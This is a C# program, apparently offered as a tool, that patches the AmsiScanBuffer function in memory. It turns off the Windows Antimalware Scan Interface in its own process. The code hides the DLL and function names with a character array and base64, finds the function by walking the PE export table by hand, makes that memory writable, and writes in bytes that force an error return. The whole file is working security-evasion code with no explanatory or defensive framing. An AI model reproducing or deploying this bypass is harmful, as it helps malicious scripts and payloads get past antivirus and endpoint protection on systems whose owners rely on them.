using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace AdvancedAmsiBypass
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, ref uint OldProtect);

        static void Main(string[] args)
        {
            string dllName = new string(new char[] { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' });
            string funcName = Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")); // "AmsiScanBuffer"

            IntPtr hModule = GetModuleHandle(dllName);
            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine("AMSI not found.");
                return;
            }

            IntPtr funcAddress = GetExportAddress(hModule, funcName);
            if (funcAddress == IntPtr.Zero)
            {
                Console.WriteLine("Function not found.");
                return;
            }

            uint size = 0x10;
            uint oldProtect = 0;
            IntPtr handle = Process.GetCurrentProcess().Handle;

            // Mudar proteção de memória
            NtProtectVirtualMemory(handle, ref funcAddress, ref size, 0x40, ref oldProtect);

            // Patch stealth: mov rax, 0x80070057 ; ret
            byte[] patch = new byte[] { 0x48, 0xB8, 0x57, 0x00, 0x07, 0x80, 0x00, 0x00, 0x00, 0x00, 0xC3 };
            Marshal.Copy(patch, 0, funcAddress, patch.Length);

            Console.WriteLine("AMSI Bypass concluded.");

            Console.ReadLine();
        }

        //Buscar função exportada
        public static IntPtr GetExportAddress(IntPtr moduleBase, string exportName)
        {
            Int32 peHeader = Marshal.ReadInt32(moduleBase, 0x3C);
            Int16 optHeaderSize = Marshal.ReadInt16(moduleBase, peHeader + 0x14);
            Int64 optHeader = peHeader + 0x18;
            Int32 exportDirectoryRVA = Marshal.ReadInt32(moduleBase, (int)(optHeader + 0x70));
            Int32 exportDirectoryVA = (int)moduleBase + exportDirectoryRVA;

            Int32 numberOfNames = Marshal.ReadInt32((IntPtr)(exportDirectoryVA + 0x18));
            Int32 namesRVA = Marshal.ReadInt32((IntPtr)(exportDirectoryVA + 0x20));
            Int32 ordinalsRVA = Marshal.ReadInt32((IntPtr)(exportDirectoryVA + 0x24));
            Int32 functionsRVA = Marshal.ReadInt32((IntPtr)(exportDirectoryVA + 0x1C));

            for (int i = 0; i < numberOfNames; i++)
            {
                Int32 nameRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + namesRVA + i * 4));
                string currentExportName = Marshal.PtrToStringAnsi((IntPtr)(moduleBase.ToInt64() + nameRVA));
                if (currentExportName.Equals(exportName, StringComparison.Ordinal))
                {
                    Int16 ordinal = Marshal.ReadInt16((IntPtr)(moduleBase.ToInt64() + ordinalsRVA + i * 2));
                    Int32 functionRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + functionsRVA + ordinal * 4));
                    return (IntPtr)(moduleBase.ToInt64() + functionRVA);
                }
            }

            return IntPtr.Zero;
        }
    }
}
